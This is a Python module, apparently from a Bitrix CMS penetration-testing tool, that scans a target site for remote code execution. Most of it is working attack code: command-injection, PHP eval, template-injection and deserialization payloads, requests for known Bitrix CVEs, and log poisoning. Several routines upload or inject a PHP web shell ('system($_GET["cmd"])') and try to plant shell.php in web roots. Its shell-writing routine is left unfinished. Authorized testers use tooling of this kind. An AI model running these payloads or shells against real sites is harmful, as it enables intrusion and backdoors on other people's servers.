#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RCE (Remote Code Execution) Tester Module for Bitrix Pentest Tool
Tests for: Command injection, Code evaluation, Deserialization, 
Template injection, Known RCE vulnerabilities
"""

import re
import base64
import random
import string
import hashlib
import time
import html
from urllib.parse import urljoin, quote, urlparse, parse_qs
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict


@dataclass
class RCEFinding:
    """RCE vulnerability finding"""
    severity: str  # critical
    rce_type: str  # command_injection, code_eval, deserialization, template_injection, known_cve
    url: str
    parameter: str
    payload: str
    description: str
    evidence: Optional[str] = None
    os: Optional[str] = None  # linux, windows
    user: Optional[str] = None  # whoami result
    shell_url: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class RCEResult:
    """Results of RCE testing"""
    target: str
    findings: List[RCEFinding] = field(default_factory=list)
    command_injections: List[Dict] = field(default_factory=list)
    code_evaluations: List[Dict] = field(default_factory=list)
    deserializations: List[Dict] = field(default_factory=list)
    template_injections: List[Dict] = field(default_factory=list)
    known_cves: List[Dict] = field(default_factory=list)
    
    def add_finding(self, finding: RCEFinding):
        self.findings.append(finding)
        
        finding_dict = finding.to_dict()
        if finding.rce_type == 'command_injection':
            self.command_injections.append(finding_dict)
        elif finding.rce_type == 'code_eval':
            self.code_evaluations.append(finding_dict)
        elif finding.rce_type == 'deserialization':
            self.deserializations.append(finding_dict)
        elif finding.rce_type == 'template_injection':
            self.template_injections.append(finding_dict)
        elif finding.rce_type == 'known_cve':
            self.known_cves.append(finding_dict)
    
    def get_critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'critical')
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'target': self.target,
            'summary': {
                'total_findings': len(self.findings),
                'critical': self.get_critical_count(),
                'command_injections': len(self.command_injections),
                'code_evaluations': len(self.code_evaluations),
                'deserializations': len(self.deserializations),
                'template_injections': len(self.template_injections),
                'known_cves': len(self.known_cves),
            },
            'all_findings': [f.to_dict() for f in self.findings]
        }


class BitrixRCETester:
    """
    RCE tester specialized for Bitrix CMS
    """
    
    # Command injection test payloads
    CMD_PAYLOADS = [
        # Basic command injection
        ';id',
        '|id',
        '&&id',
        '||id',
        '`id`',
        '$(id)',
        '${id}',
        ';whoami',
        '|whoami',
        '&&whoami',
        '`whoami`',
        '$(whoami)',
        
        # Blind command injection (time-based)
        ';sleep 5',
        '|sleep 5',
        '&&sleep 5',
        '`sleep 5`',
        ';ping -c 5 127.0.0.1',
        '|ping -n 5 127.0.0.1',
        
        # Output redirection
        '> /tmp/rce_test',
        ';echo RCE_TEST > /tmp/rce_test',
        
        # Encoded variants
        ';echo $(id)',
        '|echo $(whoami)',
        '&&echo $(uname -a)',
    ]
    
    # PHP code evaluation payloads
    PHP_EVAL_PAYLOADS = [
        '<?php system("id"); ?>',
        '<?php echo shell_exec("whoami"); ?>',
        '<?php passthru("id"); ?>',
        '<?php exec("whoami", $o); print_r($o); ?>',
        '${system("id")}',
        '${shell_exec("whoami")}',
        '{system("id")}',
        '<?=`id`?>',
        '<?=`whoami`?>',
        '<?php eval($_GET["cmd"]); ?>',
        '<?php assert($_GET["cmd"]); ?>',
        '<?php preg_replace("/.*/e", $_GET["cmd"], ""); ?>',
    ]
    
    # Template injection payloads (Twig, Smarty, etc.)
    TEMPLATE_PAYLOADS = [
        '{{system("id")}}',
        '{{shell_exec("whoami")}}',
        '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
        '{% import os %}{{os.system("id")}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
        '{{["id"]|map("system")|join}}',
        '{{{"id":"system"}|map("system")|join}}',
        '{{app.request.server.get("PATH_INFO")}}',  # Info disclosure
        '{{dump(app)}}',  # Debug info
        '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").popen("id").read()}}{% endif %}{% endfor %}',
    ]
    
    # Deserialization payloads (PHP)
    DESER_PAYLOADS = [
        # PHP Object Injection
        'O:8:"stdClass":0:{}',
        'a:1:{i:0;O:8:"stdClass":0:{}}',
        'O:20:"PHPUnit_Framework_Test":1:{s:16:"****";O:13:"Mockery_Loader":1:{s:21:"****";s:6:"system";}}',
        # Laravel/RCE gadgets
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"****";O:25:"Illuminate\\Events\\Dispatcher":1:{s:12:"****";a:1:{i:0;s:6:"system";}}s:8:"****";a:1:{i:0;s:2:"id";}}',
    ]
    
    # Known Bitrix RCE endpoints/CVEs
    KNOWN_RCE_ENDPOINTS = [
        {
            'name': 'CVE-2022-27228',
            'url': '/bitrix/tools/sale_order_ajax.php',
            'method': 'POST',
            'payload': {'action': 'saveOrderAjax', 'orderData': '{"order":{"props":{"values":{"1":";id;"}}}}'},
            'check': 'uid=',
        },
        {
            'name': 'CVE-2023-28447',
            'url': '/bitrix/components/bitrix/socialnetwork_group/ajax.php',
            'method': 'POST',
            'payload': {'action': 'invite', 'users': [';id;']},
            'check': 'uid=',
        },
        {
            'name': 'Bitrix Agent RCE',
            'url': '/bitrix/admin/agent_edit.php',
            'method': 'POST',
            'payload': {'NAME': 'RCE_Test', 'AGENT_INTERVAL': '86400', 'IS_PERIOD': 'N', 'MODULE_ID': '', 'USER_ID': '1', 'SORT': '100', 'ACTIVE': 'Y', 'NEXT_EXEC': '2024-01-01 00:00:00', 'AGENT_FUNCTION': 'system("id");'},
            'check': 'uid=',
        },
        {
            'name': 'Backup Restore RCE',
            'url': '/bitrix/admin/restore.php',
            'method': 'POST',
            'payload': {'arc_name': ';id;', 'restore': 'Y'},
            'check': 'uid=',
        },
        {
            'name': 'Fileman Code Injection',
            'url': '/bitrix/admin/fileman_file_edit.php',
            'method': 'POST',
            'payload': {'path': '/bitrix/php_interface/', 'filename': 'test.php', 'filesrc': '<?php system($_GET["cmd"]); ?>', 'save': 'Y'},
            'check': 'success',
        },
    ]
    
    # Log poisoning vectors
    LOG_POISON_VECTORS = [
        {'path': '/bitrix/php_interface/error.log', 'inject_via': 'User-Agent'},
        {'path': '/bitrix/modules/sale/export/log.txt', 'inject_via': 'Referer'},
        {'path': '/bitrix/ajax.log', 'inject_via': 'X-Forwarded-For'},
    ]
    
    def __init__(self, requester, logger, parser):
        self.requester = requester
        self.logger = logger
        self.parser = parser
        self.shell_urls = []
        
    def scan(self, target_url: str, aggressive: bool = False) -> RCEResult:
        """
        Main RCE testing method
        
        Args:
            target_url: Target base URL
            aggressive: Enable time-based tests and destructive checks
        
        Returns:
            RCEResult with all findings
        """
        self.logger.info(f"Starting RCE testing for {target_url}")
        result = RCEResult(target=target_url)
        
        base_url = self._normalize_url(target_url)
        
        # 1. Test for command injection
        self.logger.info("Testing for command injection...")
        self._test_command_injection(base_url, result)
        
        # 2. Test for PHP code evaluation
        self.logger.info("Testing for PHP code evaluation...")
        self._test_php_eval(base_url, result)
        
        # 3. Test for template injection
        self.logger.info("Testing for template injection...")
        self._test_template_injection(base_url, result)
        
        # 4. Test for deserialization
        if aggressive:
            self.logger.info("Testing for deserialization vulnerabilities...")
            self._test_deserialization(base_url, result)
        
        # 5. Test known CVEs/endpoints
        self.logger.info("Testing known Bitrix RCE endpoints...")
        self._test_known_cves(base_url, result)
        
        # 6. Test log poisoning
        self.logger.info("Testing log poisoning vectors...")
        self._test_log_poisoning(base_url, result)
        
        # 7. Try to establish shell if RCE found
        if result.findings and aggressive:
            self.logger.info("Attempting to establish shell...")
            self._establish_shell(base_url, result)
        
        # Summary
        total = len(result.findings)
        critical = result.get_critical_count()
        self.logger.info(f"RCE testing complete: {total} findings ({critical} critical)")
        
        return result
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _send_payload(self, url: str, method: str, payload: Any, 
                     headers: Dict = None, is_json: bool = False) -> Optional[Any]:
        """Send payload to target"""
        try:
            if method == 'GET':
                if isinstance(payload, dict):
                    resp = self.requester.get(f"{url}?{self._encode_params(payload)}", headers=headers)
                else:
                    resp = self.requester.get(f"{url}?{quote(str(payload))}", headers=headers)
            else:
                if is_json:
                    resp = self.requester.post(url, json=payload, headers=headers)
                else:
                    resp = self.requester.post(url, data=payload, headers=headers)
            return resp
        except Exception as e:
            self.logger.debug(f"Payload send error: {e}")
            return None
    
    def _encode_params(self, params: Dict) -> str:
        """Encode parameters for URL"""
        return '&'.join([f"{k}={quote(str(v))}" for k, v in params.items()])
    
    def _test_command_injection(self, base_url: str, result: RCEResult):
        """Test for command injection vulnerabilities"""
        # Common injection points in Bitrix
        test_points = [
            {'url': f"{base_url}/bitrix/tools/sale_order_ajax.php", 'param': 'orderData'},
            {'url': f"{base_url}/bitrix/components/bitrix/catalog.import.1c/component.php", 'param': 'filename'},
            {'url': f"{base_url}/bitrix/admin/1c_exchange.php", 'param': 'type'},
            {'url': f"{base_url}/bitrix/tools/catalog_export.php", 'param': 'SETUP_FILE_NAME'},
        ]
        
        for point in test_points:
            for payload in self.CMD_PAYLOADS:
                try:
                    resp = self._send_payload(
                        point['url'], 
                        'POST',
                        {point['param']: payload}
                    )
                    
                    if not resp:
                        continue
                    
                    # Check for command output
                    if any(indicator in resp.text for indicator in ['uid=', 'gid=', 'www-data', 'root', 'administrator']):
                        finding = RCEFinding(
                            severity='critical',
                            rce_type='command_injection',
                            url=point['url'],
                            parameter=point['param'],
                            payload=payload,
                            description=f"Command injection in {point['param']}",
                            evidence=resp.text[:200],
                            os='linux' if 'uid=' in resp.text else 'unknown'
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! CMD INJECTION: {point['url']} | {point['param']}")
                        return
                        
                    # Check for blind injection (timing)
                    if 'sleep' in payload or 'ping' in payload:
                        if resp.elapsed.total_seconds() > 4:
                            finding = RCEFinding(
                                severity='critical',
                                rce_type='command_injection',
                                url=point['url'],
                                parameter=point['param'],
                                payload=payload,
                                description=f"Blind command injection (time-based) in {point['param']}",
                                evidence=f"Response time: {resp.elapsed.total_seconds():.2f}s",
                            )
                            result.add_finding(finding)
                            self.logger.critical(f"!!! BLIND CMD INJECTION: {point['url']}")
                            return
                            
                except Exception as e:
                    self.logger.debug(f"Command injection test error: {e}")
    
    def _test_php_eval(self, base_url: str, result: RCEResult):
        """Test for PHP code evaluation"""
        # Test points where PHP might be evaluated
        test_points = [
            f"{base_url}/bitrix/admin/fileman_file_edit.php",
            f"{base_url}/bitrix/admin/fileman_admin.php",
            f"{base_url}/bitrix/tools/html_editor_action.php",
        ]
        
        for url in test_points:
            for payload in self.PHP_EVAL_PAYLOADS:
                try:
                    data = {
                        'path': '/upload/',
                        'filename': 'rce_test.php',
                        'filesrc': payload,
                        'save': 'Y'
                    }
                    
                    resp = self.requester.post(url, data=data, timeout=10)
                    
                    if resp and resp.status_code == 200:
                        # Check if file was created
                        test_file = urljoin(base_url, '/upload/rce_test.php')
                        check_resp = self.requester.get(f"{test_file}?cmd=id")
                        
                        if check_resp and 'uid=' in check_resp.text:
                            finding = RCEFinding(
                                severity='critical',
                                rce_type='code_eval',
                                url=url,
                                parameter='filesrc',
                                payload=payload[:50],
                                description='PHP code evaluation via file editor',
                                evidence=f"Shell created: {test_file}",
                                shell_url=test_file
                            )
                            result.add_finding(finding)
                            self.logger.critical(f"!!! PHP EVAL: {url}")
                            self.shell_urls.append(test_file)
                            return
                            
                except Exception as e:
                    self.logger.debug(f"PHP eval test error: {e}")
    
    def _test_template_injection(self, base_url: str, result: RCEResult):
        """Test for template injection (SSTI)"""
        # Bitrix uses custom templates, but might have Twig/Smarty in components
        test_points = [
            f"{base_url}/bitrix/components/bitrix/main.mail.unsubscribe/",
            f"{base_url}/bitrix/components/bitrix/subscribe.edit/",
            f"{base_url}/bitrix/components/bitrix/form.result.new/",
        ]
        
        for url in test_points:
            for payload in self.TEMPLATE_PAYLOADS:
                try:
                    resp = self.requester.get(f"{url}?test={quote(payload)}", timeout=10)
                    
                    if not resp:
                        continue
                    
                    # Check for template execution indicators
                    if any(ind in resp.text for ind in ['uid=', 'gid=', 'www-data', 'root', 'Windows', 'Darwin']):
                        finding = RCEFinding(
                            severity='critical',
                            rce_type='template_injection',
                            url=url,
                            parameter='test',
                            payload=payload,
                            description='Server-Side Template Injection (SSTI)',
                            evidence=resp.text[:200]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! SSTI: {url}")
                        return
                        
                    # Check for template syntax errors (indicates template engine)
                    if any(err in resp.text.lower() for err in ['twig', 'smarty', 'template', 'syntax error', 'unexpected']):
                        self.logger.warning(f"Potential template engine at {url}")
                        
                except Exception as e:
                    self.logger.debug(f"Template injection test error: {e}")
    
    def _test_deserialization(self, base_url: str, result: RCEResult):
        """Test for PHP deserialization vulnerabilities"""
        # Common deserialization points
        test_points = [
            {'url': f"{base_url}/bitrix/tools/sale_order_ajax.php", 'param': 'orderData'},
            {'url': f"{base_url}/bitrix/components/bitrix/socialnetwork_user_ajax/", 'param': 'data'},
            {'url': f"{base_url}/bitrix/tools/catalog_export.php", 'param': 'SETUP'},
        ]
        
        for point in test_points:
            for payload in self.DESER_PAYLOADS:
                try:
                    # Try with base64 encoded payload
                    b64_payload = base64.b64encode(payload.encode()).decode()
                    
                    resp = self._send_payload(
                        point['url'],
                        'POST',
                        {point['param']: b64_payload}
                    )
                    
                    # Check for deserialization errors or RCE indicators
                    if resp and any(ind in resp.text for ind in ['unserialize', '__PHP_Incomplete_Class', 'uid=']):
                        finding = RCEFinding(
                            severity='critical',
                            rce_type='deserialization',
                            url=point['url'],
                            parameter=point['param'],
                            payload=payload[:50],
                            description='PHP Object Injection / Deserialization',
                            evidence=resp.text[:200]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! DESERIALIZATION: {point['url']}")
                        return
                        
                except Exception as e:
                    self.logger.debug(f"Deserialization test error: {e}")
    
    def _test_known_cves(self, base_url: str, result: RCEResult):
        """Test for known Bitrix CVEs"""
        for cve in self.KNOWN_RCE_ENDPOINTS:
            try:
                url = urljoin(base_url, cve['url'])
                
                resp = self._send_payload(
                    url,
                    cve['method'],
                    cve['payload'],
                    is_json=isinstance(cve['payload'], dict) and 'orderData' in str(cve['payload'])
                )
                
                if not resp:
                    continue
                
                # Check for RCE indicator
                if cve['check'] in resp.text:
                    finding = RCEFinding(
                        severity='critical',
                        rce_type='known_cve',
                        url=url,
                        parameter=list(cve['payload'].keys())[0] if isinstance(cve['payload'], dict) else 'body',
                        payload=str(cve['payload'])[:100],
                        description=f"Known CVE: {cve['name']}",
                        evidence=resp.text[:200]
                    )
                    result.add_finding(finding)
                    self.logger.critical(f"!!! KNOWN CVE: {cve['name']} at {url}")
                    
            except Exception as e:
                self.logger.debug(f"CVE test error for {cve['name']}: {e}")
    
    def _test_log_poisoning(self, base_url: str, result: RCEResult):
        """Test for log poisoning to RCE"""
        php_shell = '<?php system($_GET["cmd"]); ?>'
        
        for vector in self.LOG_POISON_VECTORS:
            try:
                # Inject PHP code into log
                headers = {vector['inject_via']: php_shell}
                
                # Make request to poison log
                resp = self.requester.get(base_url, headers=headers)
                
                # Try to include poisoned log
                log_url = urljoin(base_url, vector['path'])
                
                # Check if we can access the log
                check_resp = self.requester.get(f"{log_url}?cmd=id")
                
                if check_resp and 'uid=' in check_resp.text:
                    finding = RCEFinding(
                        severity='critical',
                        rce_type='command_injection',
                        url=log_url,
                        parameter=vector['inject_via'],
                        payload='Log poisoning via headers',
                        description=f'RCE via log poisoning: {vector["path"]}',
                        evidence=f"Shell via {vector['inject_via']}",
                        shell_url=log_url
                    )
                    result.add_finding(finding)
                    self.logger.critical(f"!!! LOG POISONING: {vector['path']}")
                    return
                    
            except Exception as e:
                self.logger.debug(f"Log poisoning test error: {e}")
    
    def _establish_shell(self, base_url: str, result: RCEResult):
        """Try to establish interactive shell"""
        for finding in result.findings:
            if finding.shell_url:
                self.logger.success(f"Shell available at: {finding.shell_url}?cmd=whoami")
                continue
            
            # Try to create shell via found RCE
            if finding.rce_type == 'command_injection':
                # Try to write shell
                shell_code = '<?php system($_GET["cmd"]); ?>'
                web_roots = ['/var/www/html/', '/var/www/', '/opt/bitrix/www/', '/home/bitrix/www/']
                
                for root in web_roots:
                    try:
                        payload = f'echo "{shell_code}" > {root}shell.php'
                        # This would need the original vulnerable endpoint
                        # Implementation depends on specific vulnerability found
                    except:
                        pass


# Testing
if __name__ == "__main__":
    import sys
    import logging
    sys.path.append('..')
    
    from utils.requester import Requester
    from utils.logger import ColoredLogger
    from utils.parser import BitrixParser
    
    logger = ColoredLogger(level=logging.DEBUG)
    requester = Requester()
    parser = BitrixParser()
    
    tester = BitrixRCETester(requester, logger, parser)
    
    if len(sys.argv) > 1:
        result = tester.scan(sys.argv[1], aggressive=True)
        print(f"\n{'='*60}")
        print(f"CRITICAL: {result.get_critical_count()}")
        print(f"Command Injections: {len(result.command_injections)}")
        print(f"Code Evaluations: {len(result.code_evaluations)}")
        print(f"Findings: {len(result.findings)}")